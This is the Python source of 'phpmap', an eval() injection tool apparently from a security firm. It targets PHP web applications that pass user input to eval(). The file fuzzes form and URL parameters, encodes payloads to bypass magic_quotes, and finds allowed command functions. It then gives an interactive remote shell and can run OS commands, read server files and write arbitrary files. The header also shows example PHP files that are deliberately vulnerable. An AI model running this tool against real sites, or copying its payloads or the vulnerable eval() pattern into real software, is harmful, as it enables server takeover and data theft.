#--
#
# Description:
#       This tool is used to exploit poorly sanitized user input in PHP 
#       web applications. 
#
#       Author: Matthew "Level" Bergin @ CORE Security Technologies, CORE SDI Inc.
#       Email: mbergin@coresecurity.com
#
#
# Copyright (c) CORE Security, CORE SDI Inc.
# All rights reserved.
#
# This computer software is owned by Core SDI Inc. and is
# protected by U.S. copyright laws and other laws and by international
# treaties.  This computer software is furnished by CORE SDI Inc.
# pursuant to a written license agreement and may be used, copied,
# transmitted, and stored only in accordance with the terms of such
# license and with the inclusion of the above copyright notice.  This
# computer software or any other copies thereof may not be provided or
# otherwise made available to any other person.
#
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
# FOR ANY DIRECT,  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
# CONSEQUENTIAL  DAMAGES RESULTING FROM THE USE OR MISUSE OF
# THIS SOFTWARE
#
#Example HTML:
#<html>
#<body>
#<form name="coresec" method="get" action="eval.php">
#<input type="text" name="code"/>
#<input type="submit" value="submit" name="submit"/>
#</form>
#<body>
#</html>
#
#Example Vulnerable File 1:
#<?php
#$code = $_GET['code'];
#/* This demonstrates the removal of non shell text and html */
#$buffer = "-------------------------------\n";
#echo $buffer."Hello ";
#/* below is the vulnerable eval(); function call */
#eval("echo ".$code);
#echo $buffer;
#?>
#
#Example Vulnerable File 2:
#<?php $code = $_GET['code']; eval($code); ?>
#--

import sys, re, random, urllib, urllib2, base64
from bs4 import BeautifulSoup
from optparse import OptionParser

class HTTP:	
	def getPage(self,url):
		try:
			page = urllib2.urlopen(url)
		except:
			print "[*] error grabbing page"
			sys.exit()
		soup = BeautifulSoup(markup=page.read(),features='html')
		return soup
			
	class Parse:
		def findForms(self,url):
			results_get,results_post = {},{}
			soup = HTTP().getPage(url)
			for formTag in soup.findAll('form'):
				if formTag.has_key('action'):
					if (formTag['action'] != "#"):
						#prep for post support
						if formTag.has_key('method') and formTag['method'] == "post":
							for i in xrange(0,len(soup.findAll('form'))):
								for inputTag in soup.findAll('form')[i].findAll('input'):
									try:
										results_post[formTag['action']+str(i)] = {inputTag['name']:inputTag['value']}
									except:
										results_post[formTag['action']+str(i)] = {inputTag['name']:0}
						else:
							for i in xrange(0,len(soup.findAll('form'))):
								for inputTag in soup.findAll('form')[i].findAll('input'):
									try:
										results_get[formTag['action']+str(i)] = {inputTag['name']:inputTag['value']}
									except:
										results_get[formTag['action']+str(i)] = {inputTag['name']:0}
									i+=1
			return results_get,results_post
			
		def strings(self,data):
			p = re.compile(r'<.*?>')
			return p.sub('', data)	
			
	
class Attack:
	def isInjectable(self,case):
		num1,num2 = random.randrange(100,1000), random.randrange(100,1000)
		if (random.randrange(0,1) is not 1):
			answer = num1+num2
			code = "echo %s + %s;" % (num1,num2)
		else:
			answer = num1-num2
			code = "echo %s - %s;" % (num1,num2)
		
		return 

	def strings(self):
		letters = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
		return letters[random.randrange(0,26)]*random.randrange(50,100)
		
	def bypass_magic_shell(self,func,cmd):
		bym = "$a = array("
		for i in cmd: bym += "%s," % (ord(i))
		bym=bym[:-1]
		bym += ");"
		bym+=' for ($i=0;$i<count($a);$i++) { $b[$i] = chr($a[$i]); } %s(implode($b));' % (func)
		return bym
		
	def bypass_magic_dect(self):
		bym = "$a = array("
		for i in Attack().strings(): bym += "%s," % (ord(i))
		bym=bym[:-1]
		bym += ");"
		bym+=' for ($i=0;$i<count($a);$i++) { $b[$i] = chr($a[$i]); } echo implode($b);'
		return bym
	
	def fuzz_gen(self,params,bypass_magic):
		if (bypass_magic == True):
			php_split,list = [';',"';",'";','");',"');",'\n";',"\n';","\r\n';",'\r\n";','\r\n";',"\r\n';","';\n';",'";\n";','";";',"';';",'"];',"'];",'");];',"');];",'"]"];',"']'];"],[]
			for key in params.iterkeys():
				list.append(urllib.urlencode({'%s' % (key):'%s' % (str(params[key])+'if (get_magic_quotes_gpc()) { %s }' % (Attack().bypass_magic_dect()))}))
				list.append(urllib.urlencode({'%s' % (key):'%s' % (str(params[key])+'<?php if (get_magic_quotes_gpc()) { %s }' % (Attack().bypass_magic_dect()))}))
			for key in params.iterkeys():
				for split in php_split:
					list.append(urllib.urlencode({'%s' % (key):'%s%s' % (str(params[key])+split,'if (get_magic_quotes_gpc()) { %s }' % (Attack().bypass_magic_dect()))}))
			return list
		else:
			php_split,list = [';',"';",'";','");',"');",'\n";',"\n';","\r\n';",'\r\n";','\r\n";',"\r\n';","';\n';",'";\n";','";";',"';';",'"];',"'];",'");];',"');];",'"]"];',"']'];"],[]
			for key in params.iterkeys():
				list.append(urllib.urlencode({'%s' % (key):'%s' % (str(params[key])+'echo "%s";') % (Attack().strings())}))
				list.append(urllib.urlencode({'%s' % (key):'%s' % (str(params[key])+'<?php echo "%s"; ?>') % (Attack().strings())}))
			for key in params.iterkeys():
				for split in php_split:
					list.append(urllib.urlencode({'%s' % (key):'%s%s' % (str(params[key])+split,'echo "%s";') % (Attack().strings())}))
			return list
		
	def find_func(self,case):
		seed = random.random()
		#thanks http://www.nutt.net/2007/04/08/list-functions-disabled-in-php/
		funcString = """%24disabled_functions+%3D+ini_get('disable_functions')%3B+if+(%24disabled_functions!%3D'')+%7B+%24arr+%3D+explode('%2C'%2C+%24disabled_functions)%3B+sort(%24arr)%3B+for+(%24i%3D0%3B%24i+%3C+count(%24arr)%3B%24i%2B%2B)+%7B+echo+%24arr%5B%24i%5D.'%2C'%3B+%7D+%7D%0A"""
		payload = "echo %s;%s;echo %s;" % (seed,funcString,seed)
		payload = payload.replace(" ","+")
		url = "%s?%s=%s" % (case.split("?")[0],case.split("?")[1].split("=")[0],payload)
		func_list = ["system","passthru","exec","shell_exec","proc_open"]

		page = urllib2.urlopen(url)
		data = page.read()

		for func in func_list:
			if func in data.split(str(seed))[1].replace(" ","").rstrip(",").split(","):
				print "[*] host does not allow php function: %s" % (func)
			else:
				return func
		

	def open_shell(self,case,func,cmd):
		seed = random.random()
		funcString = "%s('%s')" % (func,cmd)
		payload = "echo %s;%s;echo %s;" % (seed,funcString,seed)
		payload = payload.replace(" ","+")
		url = "%s?%s=%s" % (case.split("?")[0],case.split("?")[1].split("=")[0],payload)
		try:
			page = urllib2.urlopen(url)
		except:
			return
		return HTTP().Parse().strings(page.read()).split(str(seed))[1]
	
	def open_shell_mg(self,case,cmd):
		seed = random.random()
		payload = urllib.quote("echo+%s;%secho+%s;" % (seed,cmd,seed))
		url = "%s?%s=%s" % (case.split("?")[0],case.split("?")[1].split("=")[0],payload)
		try:
			page = urllib2.urlopen(url)
		except:
			return
		return HTTP().Parse().strings(page.read()).split(str(seed))[1]
	
	def fingerprint(self,case):
		seed = random.random()
		payload = "echo %s;echo %s;echo %s;echo %s;echo %s;" % (seed,"getcwd()",seed,"get_current_user()",seed)
		payload = payload.replace(" ","+")
		url = "%s?%s=%s" % (case.split("?")[0],case.split("?")[1].split("=")[0],payload)
		page = urllib2.urlopen(url)
		data = page.read()
		return HTTP().Parse().strings(data).split(str(seed))[1], HTTP().Parse().strings(data).split(str(seed))[2]

	class File:
		def fs_read(self,case,file):
			seed = random.random()
			payload = "echo+"+str(seed)+"%3B%24handle+%3D+%40fopen(%22"+file+"%22%2C+%22r%22)%3B+if+(%24handle)+%7B+while+(!feof(%24handle))+%7B+%24buffer+%3D+fgetss(%24handle%2C+4096)%3B+echo+%24buffer%3B+%7D+fclose(%24handle)%3B+%7D"+"%3Becho+"+str(seed)+"%3B"
			payload = payload.replace(" ","+")
			url = "%s?%s=%s" % (case.split("?")[0],case.split("?")[1].split("=")[0],payload)
			page = urllib2.urlopen(url)
			return HTTP().Parse().strings(page.read()).split(str(seed))[1]
		
		def fs_write(self,case,file,data):
			seed = random.random()
			payload = "echo+"+str(seed)+"%3B%24data+%3D+base64_decode(%24_GET%5B'data'%5D)%3B+%24file+%3D+%24_GET%5B'file'%5D%3B+%24f+%3D+fopen(%24file%2C'wb')%3B+fwrite(%24f%2C%24data%2Cstrlen(%24data))%3B+fclose(%24f)%3B+echo+'done'%3B%0A%0A%0A"+"echo+"+str(seed)+"%3B"
			url = "%s?%s=%s&data=%s&file=%s" % (case.split("?")[0],case.split("?")[1].split("=")[0],payload,data,file)
			page = urllib2.urlopen(url)
			return HTTP().Parse().strings(page.read()).split(str(seed))[1]
	
class Help:
	def init(self):
		print """
-----------------------------------------------------------------
|      phpmap 0.2.1, eval() injection tool                      |
|      Matt Bergin / CORE Security                              |
|      !! next testcase, !$ quit                                |
-----------------------------------------------------------------

Here we go again...
			"""
		parser = OptionParser()
		parser.add_option("--url", dest="url",help="Target URL")
		parser.add_option("--forms",action="store_true",help="Fuzz forms on target url")
		#parser.add_option("--ver",dest="verbose", default=1,help="Message intensity, 0-4")		
		#parser.add_option("--domain", dest="domain",help="Only fuzz inputs on specified domain")
		#parser.add_option("--crawl",help="Crawl the target page for input forms")
		#parser.add_option("--cookie",help="Specify a valid cookie to be used")
		#parser.add_option("--depth",help="Crawl depth, default 3")
		#parser.add_option("--basic",dest="basic",help="Basic authentication, user:pass")
		#parser.add_option("--loginform",dest="loginform",help="Login form, file:form:user:pass")
		#parser.add_option("--backdoor",help="Inject a backdoor into the file system")
		parser.add_option("--os-shell",action="store_true",help="Generate shell on target host")
		parser.add_option("--bypass-magic",action="store_true",help="Bypass magic_qpc_quotes")
		parser.add_option("--os-cmd",dest="osCmd",help="Send specified OS command")
		parser.add_option("--fs-read",dest="fileRead",help="Read a file from the target")
		parser.add_option("--fs-write",dest="fileWrite",help="Write a file to the target")
		parser.add_option("--fingerprint",action="store_true",help="Retrieves information about the target")
		
		(o, a) = parser.parse_args()
		return o
		
def main():
	opt = Help().init()
	if opt.url is None: 
		print "[*] the URL was not provided"
		sys.exit()
		
	print "[*] Attacking %s" % (opt.url)
			
	# Attack forms on page 
	if (opt.forms == True):
		forms_get,forms_post = HTTP().Parse().findForms(opt.url)
		if (forms_get != {}):
			urlBase = opt.url.split("?")[0]
			targetList,fuzz_list, params = [],[], {}
			for key in forms_get.keys():
				for key2 in forms_get[key].keys():
					params[key2] = forms_get[key][key2]
			fuzz_list = Attack().fuzz_gen(params,opt.bypass_magic)
			for fuzz in fuzz_list:
				if opt.bypass_magic != True:
					dectRand = fuzz.split("=")[1].split("echo")[1][4:-6]
				else:
					length = len(urllib2.unquote(fuzz.split("=")[1].split("echo")[0].split("array")[1][3:-118]).split(","))
					char = urllib2.unquote(fuzz.split("=")[1].split("echo")[0].split("array")[1][3:-118]).split(",")[0]
					dectRand = chr(int(char))*length
				try:
					target = "http://%s/%s?%s" % (urlBase.split("/")[2],key[:-1],fuzz)
					page = urllib2.urlopen(target)
				except:
					continue
				if page:
					if dectRand in page.read():
						print "[*] host is potentially vulnerable.."
			
						if (opt.fingerprint == True):
							cwd,user = Attack().fingerprint(target)
							print "[*] web root is %s\n[*] current user is %s" % (cwd,user)
										
						if (opt.os_shell == True):
							if opt.bypass_magic != True:
								func = Attack().find_func(target)
								print "[*] host allows command function: %s" % (func)
								while True:
									cmd = raw_input("#").replace(" ","+")
									if (cmd == "!!"):
										break
									elif (cmd == "!$"):
										print "[*] thanks, shout out to smashthestack.org"
										sys.exit()
									print Attack().open_shell(target,func,cmd)
							else:
								print "[*] can not find system function dynamically, using passthru"
								while True:
									cmd = raw_input("#").replace(" ","+")
									if (cmd == "!!"):
										break
									elif (cmd == "!$"):
										print "[*] thanks, shout out to smashthestack.org"
										sys.exit()
									print Attack().open_shell_mg(target,Attack().bypass_magic_shell('passthru',cmd))
			
						if (opt.osCmd is not None):
							if opt.bypass_magic != True:
								func = Attack().find_func(target)
								print "[*] host allows command function: %s" % (func)
								print Attack().open_shell(target,func,opt.osCmd.replace(" ","+"))
							else:
								print "[*] can not find system function dynamically, using passthru"
								print Attack().open_shell_mg(target,Attack().bypass_magic_shell('passthru',opt.osCmd))
							sys.exit()
						
						if (opt.fileRead is not None):
							if opt.bypass_magic != True:
								print Attack().File().fs_read(target,opt.fileRead)
							else:
								print "[*] --bypass-magic does not support --fs-read yet"
							sys.exit()
				
						if (opt.fileWrite is not None):
							if opt.bypass_magic != True:
								try:
									fp = open(opt.fileWrite,'r')
									data = base64.b64encode(fp.read())
								except:
									print "[*] Could not read local file %s" % (opt.fileWrite)
								print Attack().File().fs_write(target,opt.fileWrite,data)
							else:
								print "[*] --bypass-magic does not support --fs-write yet"
							sys.exit()
							
					else:
						print "[*] Detection payload not found"
				else:
					print "[*] hitting next target"
		
# Attack url GET variables
	else:
		urlBase = opt.url.split("?")[0]
		urlParam = opt.url.split("?")[1]
		targetList = []
		fuzz_list = Attack().fuzz_gen({urlParam.split("=")[0]:urlParam.split("=")[1]},opt.bypass_magic)
		if opt.bypass_magic == True: print "[*] bypasing magic_quotes_gpc()"
		for fuzz in fuzz_list:
			targetList.append("%s?%s" % (urlBase,fuzz))
		for target in targetList:
			if opt.bypass_magic != True:
				dectRand = target.split("=")[1].split("echo")[1][4:-6]
			else:
				length = len(urllib2.unquote(target.split("=")[1].split("echo")[0].split("array")[1][3:-118]).split(","))
				char = urllib2.unquote(target.split("=")[1].split("echo")[0].split("array")[1][3:-118]).split(",")[0]
				dectRand = chr(int(char))*length
			try:
				page = urllib2.urlopen(target)
			except:
				continue
			if page:
				if dectRand in page.read():
					print "[*] host is potentially vulnerable.."
				
					if (opt.fingerprint == True):
						cwd,user = Attack().fingerprint(target)
						print "[*] web root is %s\n[*] current user is %s" % (cwd,user)
				
					if (opt.os_shell == True):
						if opt.bypass_magic != True:
							func = Attack().find_func(target)
							print "[*] host allows command function: %s" % (func)
							while True:
								cmd = raw_input("#").replace(" ","+")
								if (cmd == "!!"):
									break
								elif (cmd == "!$"):
									print "[*] thanks, shout out to smashthestack.org"
									sys.exit()
								print Attack().open_shell(target,func,cmd)
						else:
							print "[*] can not find system function dynamically, using passthru"
							while True:
								cmd = raw_input("#").replace(" ","+")
								if (cmd == "!!"):
									break
								elif (cmd == "!$"):
									print "[*] thanks, shout out to smashthestack.org"
									sys.exit()
								print Attack().open_shell_mg(target,Attack().bypass_magic_shell('passthru',cmd))

					if (opt.osCmd is not None):
						if opt.bypass_magic != True:
							func = Attack().find_func(target)
							print "[*] host allows command function: %s" % (func)
							print Attack().open_shell(target,func,opt.osCmd.replace(" ","+"))

						else:
							print "[*] can not find system function dynamically, using passthru"
							print Attack().open_shell_mg(target,Attack().bypass_magic_shell('passthru',opt.osCmd))
						sys.exit()
					
					if (opt.fileRead is not None):
						if opt.bypass_magic != True:
							print Attack().File().fs_read(target,opt.fileRead)
						else:
							print "[*] --bypass-magic does not support --fs-read yet"
						sys.exit()
						
					if (opt.fileWrite is not None):
						if opt.bypass_magic != True:
							try:
								fp = open(opt.fileWrite,'r')
								data = base64.b64encode(fp.read())
							except:
								print "[*] Could not read local file %s" % (opt.fileWrite)
								sys.exit()
							print Attack().File().fs_write(target,opt.fileWrite,data)
						else:
							print "[*] --bypass-magic does not support --fs-write yet"
						sys.exit()	
				else:
					print "[*] Detection payload not found"
			else:
				print "[*] hitting next target"

	print "[*] finished scanning"

		
# Run Entry Point Main
if __name__=="__main__":
	main()
